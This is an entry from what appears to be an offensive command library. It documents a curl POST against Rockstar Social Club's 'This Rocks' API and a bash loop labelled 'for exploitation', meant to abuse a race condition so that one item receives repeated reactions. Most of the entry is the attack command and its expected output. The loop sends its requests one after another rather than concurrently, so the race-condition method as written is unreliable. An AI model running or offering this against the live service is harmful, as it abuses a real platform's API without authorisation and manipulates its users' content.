---
id: 123e4567-e89b-12d3-a456-426614174004
name: curl-invoke-this-rocks
type: command
executor: bash
data: >-
  curl -X POST -H "Authorization: Bearer [your_token]" -H "Content-Type:
  application/json" -d '{"item_id": "target_item_id"}'
  https://socialclub.rockstargames.com/api/v1/rocks/create
output: null
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:24:18.935Z'
platforms:
  - Linux
  - macOS
  - Windows
tags:
  - api
  - exploit
verified: false
validated: true
submitted: true
---

# curl-invoke-this-rocks

## Command

```bash
curl -X POST -H "Authorization: Bearer [your_token]" -H "Content-Type: application/json" -d '{"item_id": "target_item_id"}' https://socialclub.rockstargames.com/api/v1/rocks/create
```

## Description

This command sends an HTTP POST request to the 'This Rocks' API endpoint on Social Club, invoking the action for a specified item ID. Used to test and exploit the race condition by repeating it rapidly.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies POST method | Yes |
| `-H "Authorization: Bearer [your_token]"` | Authentication header with JWT token | Yes |
| `-H "Content-Type: application/json"` | Sets JSON payload type | Yes |
| `-d '{"item_id": "target_item_id"}'` | JSON body with target item ID | Yes |
| `https://socialclub.rockstargames.com/api/v1/rocks/create` | API endpoint URL | Yes |

## Examples

### Basic Usage

```bash
curl -X POST -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..." -H "Content-Type: application/json" -d '{"item_id": "12345"}' https://socialclub.rockstargames.com/api/v1/rocks/create
```

### Advanced Usage

Loop for exploitation:

```bash
for i in {1..10}; do curl -X POST -H "Authorization: Bearer [token]" -H "Content-Type: application/json" -d '{"item_id": "12345"}' https://socialclub.rockstargames.com/api/v1/rocks/create; done
```

## Expected Output

Successful response: {"success": true, "message": "You rocked this post!"} or similar JSON indicating the action completed. In race condition, multiple successes without errors.

## Related

- [[Related Procedure|procedures/Exploit-Race-Condition-with-Curl]]
